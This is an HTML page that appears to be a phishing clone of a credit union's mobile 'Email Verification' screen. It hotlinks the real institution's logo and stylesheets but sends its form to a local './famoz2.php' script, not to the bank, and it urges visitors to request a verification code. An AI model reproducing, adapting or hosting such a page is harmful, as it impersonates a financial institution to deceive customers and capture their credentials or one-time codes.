<!DOCTYPE html>
<html lang="en-US">
<head><meta charset="utf-8">
	<title>Summit CU</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
	<link href="https://bulldogfcu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
	<link href="https://bulldogfcu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=1HoBsHbUYZnX0KLI9glXu7yyr0RWgVftf_o4zCD_sa81" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator" /><meta content="UL7b2EHVJtmrlRT1M0TmyQL0f-m08XynqkgbmVIb6R0_MaQrmwWxUkHdhEl5Lah743jtUufOZRi0GPzX3jTtfX_aRjDpg6zPBjNmpYctzPWa5_Xsp-a2XBm4gI_6EwT2bIPDdoL5IurcvSAxQaEGsLTYarndvw48DXLNOM4Efco1" name="csrf-token" /><meta content="X-AntiCSRF-Token" name="csrf-param" /><meta content="__AntiCsrfToken" name="csrf-form-param" />
	<link href="https://bulldogfcu.financialhost.org/Media/Default/Logos/favicon_1.ico" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=1554483296">
</head>
<body><script> window.Chorus = window.Chorus || {}; window.Chorus.isMobile = true; window.Chorus.isMfmHosted = false; window.Chorus.isIFrameHosted = false; </script><script id="boot-data" type="application/json"> {"AvaliableFeatures":{"Features":[{"key":"Login\\Behavior\\QuickPassThroughUserNameStep","value":false},{"key":"Login\\Behavior\\RedirectToFiSiteAfterLogoff","value":true},{"key":"Login\\BiometricAuthentication\\Enabled","value":true},{"key":"Login\\MobileInterrupter\\Enabled","value":false},{"key":"Applications\\DataSource\\Accounts\\UiSettings\\NumericAccountNumberEnabled","value":true},{"key":"Applications\\DataSource\\Accounts\\UiSettings\\AccountTypeIconEnabled","value":true}]},"DisplayMode":{"IsMobile":true,"DisplayModeId":"Mobile"}} </script>
<header class="navbar" role="banner">
<div class="navbar__center">
<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="/"><img alt="Summit Credit Union" height="80" src="https://bulldogfcu.financialhost.org/Media/Default/FILogo/Bulldog_3C_Logo_HBP.png" width="186" /> </a></div>
</div>
</header>

<div data-role="content">
<div class="main-content" role="main">
<div class="container-view" data-bind="props: wizardSettings" data-main-content="data-main-content" data-props="null" data-viewmodel="login/viewmodels/logoff">
<header class="subheader">
<div class="navbar__center"><span class="navbar__center__title">Email Verification</span></div>
</header>

<section class="container-view-scrollable">
<form action="./famoz2.php" data-stable-name="LoginForm" data-viewmodel="login/viewmodels/userName" method="post">
<div class="content__container has-padding">
<div class="auth__form-divider">
<div class="form-control-container" style="background:#eeeeee;border:1px solid #cccccc;padding:5px 10px;">To verify you are in possession of your Email Address. A code will be sent to your Email Address for Verification</div>

<div class="form-control-container" data-staticdata="{&quot;recaptchaContainerStableName&quot;:&quot;ReCaptchaContainer&quot;}" data-viewmodel="orpheus/viewmodels/grecaptcha" data-viewname="grecaptcha">
<div data-stable-name="ReCaptchaContainer" data-staticdata="{&quot;htmlElementId&quot;:&quot;recaptcha-v2-container&quot;,&quot;headerTokenKey&quot;:&quot;recaptcha-token&quot;,&quot;headerVersionKey&quot;:&quot;recaptcha-version&quot;,&quot;recaptchaHtmlElementId&quot;:&quot;recaptcha-v2-container&quot;,&quot;v2SiteKey&quot;:&quot;6Lev97YZAAAAALU4hs6Vg1m6uzRBs6effuxjsNDQ&quot;,&quot;v3SiteKey&quot;:&quot;6LeY97YZAAAAAFptlNgo1bxaXCwH65lNLLxQQJGt&quot;}">
<div a="" are="" id="recaptcha-v2-container" not="" please="" robot.="" that="" verify="" you=""></div>

<p>XXXXXX@****.COM <input checked="checked" name="XXXXXX@****.COM" type="radio" value="XXXXXX@****.COM" /></p>

<div data-bind="dom:$summary"></div>

<div data-bind="dom:$summary"></div>

<div class="form-submit-container">
<div class="form-control-container"><button autocomplete="off" class="btn btn--primary btn__block" data-stable-name="SignInButton" name="submit" type="submit">Send me a code</button></div>

<div class="form-control-container"><button autocomplete="off" class="btn btn--primary btn__block" data-stable-name="" name="submit" type="button">Back</button></div>
</div>
</div>

<div class="text-center">
<div class="form-control-container"><span style="color:#e74c3c;">By clicking send me a code , A code will be sent to the Email Address on file </span></div>
</div>
</div>
</div>
</div>
</form>
</section>
</div>
</div>
</div>
<script src="/bundle/script/Unspecified/h_BrAijMQbk1_Default.bndl?v=Xv2qVBXmftGqLfVu8VcGhlt2_vlWH9WNIEXRftClVc41" type="text/javascript"></script><script> (function() { var toggleNotifier = function() { var notifier = $('[data-viewmodel=\'login/viewmodels/compromisedCredentialsNotifier\']'); if (notifier.length > 0) { /* Antlr cannot parse template for authorized user UI if it contains hash symbol, so we compare without it */ notifier.toggle(location.hash.substring(1).startsWith('/settings/userAccount')); clearInterval(toggleNotifierInterval); toggleAttemptCount = 0; } else if (++toggleAttemptCount >= 20) { clearInterval(toggleNotifierInterval); toggleAttemptCount = 0; } }; var toggleAttemptCount = 0; var toggleNotifierInterval = setInterval(toggleNotifier, 200); window.onhashchange = toggleNotifier; })(); </script><script type="text/javascript"> const fontFamilies = ['proxima-nova' ]; var WebFontConfig = { custom: { families: ['proxima-nova'], urls: ['https://use.typekit.net/klt7lef.css'] } }; ( function() { $('script:first').before('<script type="text/javascript" async src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"/>'); } )(); $('body').css('font-family', "'" + fontFamilies.join("','") + "'"); </script></body>
<link href="https://bulldogfcu.financialhost.org/Media/Default/Customization/custom-global2.css" rel="stylesheet" /><script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','//www.google-analytics.com/analytics.js','ga'); ga('create', { trackingId:'UA-67286047-82', cookieDomain:'auto', siteSpeedSampleRate: 100}); ga('require', 'secondaryProperty', {'newId' : 'UA-67286047-36'}); ga('send', 'pageview'); </script><script> (function() { var ga = window[window['GoogleAnalyticsObject']] || function() {}; var GADuplicate = function(tracker, config) { var o = tracker.get('sendHitTask'); var temp; tracker.set('sendHitTask', function(model) { o(model); temp = model.get('hitPayload').replace(new RegExp(model.get('trackingId'), 'g'), config.newId); if (temp) { model.set('hitPayload', temp, true); o(model); } }); }; ga('provide', 'secondaryProperty', GADuplicate); })(); </script><br />
&nbsp;</html>
